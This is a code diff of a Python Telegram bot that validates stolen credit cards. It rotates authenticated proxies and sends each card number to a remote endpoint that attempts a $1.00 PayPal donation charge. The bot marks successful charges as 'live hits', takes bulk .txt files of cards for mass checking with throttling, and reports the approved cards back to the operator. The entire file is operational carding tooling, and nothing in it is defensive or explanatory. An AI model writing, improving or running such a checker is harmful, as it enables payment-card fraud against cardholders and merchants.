@@ -23,35 +23,35 @@ def get_proxy():
     proxy_str = random.choice(PROXIES)
     user, passw, host, port = proxy_str.split(':')
     proxy_url = f"http://{user}:{passw}@{host}:{port}"
-    print(f"[{datetime.now().strftime('%H:%M:%S')}] PROXY USED → {host}:{port}")
-    return {"http": proxy_url, "https": proxy_url}, f"{host}:{port}"
+    print(f"[{datetime.now().strftime('%H:%M:%S')}] PROXY → {host}:{port}")
+    return {"http": proxy_url, "https": proxy_url}
 
 def pali(ccx):
     ccx = ccx.strip()
     current_time = datetime.now().strftime('%H:%M:%S')
-    proxy_dict, proxy_used = get_proxy()
+    proxy_dict = get_proxy()
     
     print(f"[{current_time}] CHECKING → {ccx}")
     
     try:
         url = f"http://138.128.240.15:8025/paypal_donate?cc={ccx}"
-        print(f"[{current_time}] API CALL → {url}")
+        print(f"[{current_time}] API → {url}")
         
         r = requests.get(url, proxies=proxy_dict, timeout=30)
         text = r.text
         
         print(f"[{current_time}] STATUS → {r.status_code}")
-        print(f"[{current_time}] RESPONSE → {text[:400]}")
+        print(f"[{current_time}] RES → {text[:300]}")
         
-        if "ORDER APPROVED" in text.upper() or "APPROVED" in text.upper() or "SUCCESS" in text.upper():
-            print(f"[{current_time}] ✅ LIVE HIT")
+        if any(x in text.upper() for x in ["ORDER APPROVED", "APPROVED", "SUCCESS"]):
+            print(f"[{current_time}] ✅ CHARGED")
             return "CHARGE 1.00$"
         else:
             print(f"[{current_time}] ❌ DECLINED")
             return "DECLINED"
 
     except Exception as e:
-        print(f"[{current_time}] ❌ ERROR: {e}")
+        print(f"[{current_time}] ERROR → {e}")
         return "ERROR"
 
 def luhn_check(number: str) -> bool:
@@ -98,5 +98,73 @@ def single_check(message):
             return bot.edit_message_text("Invalid Card Format!", message.chat.id, ko)
 
         last = pali(cc)
-        msg = f'''<strong>#PayPal_Custom 1.00$ 🔥
-- - - - - - - - - - - - - -
+        msg = f"<strong>#PayPal_Custom 1.00$ 🔥\nCard: <code>{cc}</code>\nStatus: <code>{last}</code>\nChecked by: @TomanSamurai</strong>"
+        bot.edit_message_text(msg, message.chat.id, ko, parse_mode="HTML")
+    except Exception as e:
+        bot.edit_message_text(f"Error: {e}", message.chat.id, ko)
+
+@bot.message_handler(content_types=['document'])
+def handle_document(message):
+    if not message.document.file_name.endswith('.txt'):
+        return bot.reply_to(message, "Only .txt file allowed!")
+
+    user_id = str(message.from_user.id)
+    file_info = bot.get_file(message.document.file_id)
+    downloaded = bot.download_file(file_info.file_path)
+    filename = f"com{user_id}.txt"
+
+    with open(filename, "wb") as f:
+        f.write(downloaded)
+
+    bts = types.InlineKeyboardMarkup()
+    bts.add(types.InlineKeyboardButton(text='PayPal Custom 1.00$', callback_data='ottpa2'))
+    bot.reply_to(message, 'Select Gate:', reply_markup=bts)
+
+@bot.callback_query_handler(func=lambda call: call.data == 'ottpa2')
+def mass_check(call):
+    def checker():
+        user_id = str(call.from_user.id)
+        filename = f"com{user_id}.txt"
+        passs = 0
+        basl = 0
+
+        bot.edit_message_text("- Processing File...", call.message.chat.id, call.message.message_id)
+
+        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
+            lines = f.readlines()
+
+        total = len(lines)
+        stopuser.setdefault(user_id, {})['status'] = 'start'
+
+        for cc in lines:
+            if stopuser.get(user_id, {}).get('status') == 'stop':
+                bot.edit_message_text("✅ Stopped!", call.message.chat.id, call.message.message_id)
+                return
+
+            cc_clean = reg(cc.strip())
+            if not cc_clean:
+                continue
+
+            last = pali(cc_clean)
+
+            if "CHARGE" in last or "APPROVED" in last.upper():
+                passs += 1
+                bot.send_message(call.from_user.id, f"✅ Charged!\n{cc_clean}\n{last}")
+            else:
+                basl += 1
+
+            time.sleep(6)
+
+        bot.edit_message_text(f"✅ Done!\nApproved: {passs}\nDeclined: {basl}\nTotal: {total}", 
+                              call.message.chat.id, call.message.message_id)
+
+    threading.Thread(target=checker, daemon=True).start()
+
+@bot.callback_query_handler(func=lambda call: call.data == 'stop')
+def stop_check(call):
+    uid = str(call.from_user.id)
+    stopuser.setdefault(uid, {})['status'] = 'stop'
+    bot.answer_callback_query(call.id, "Stopped ✅")
+
+print("🚀 Bot Started Successfully")
+bot.infinity_polling(none_stop=True)
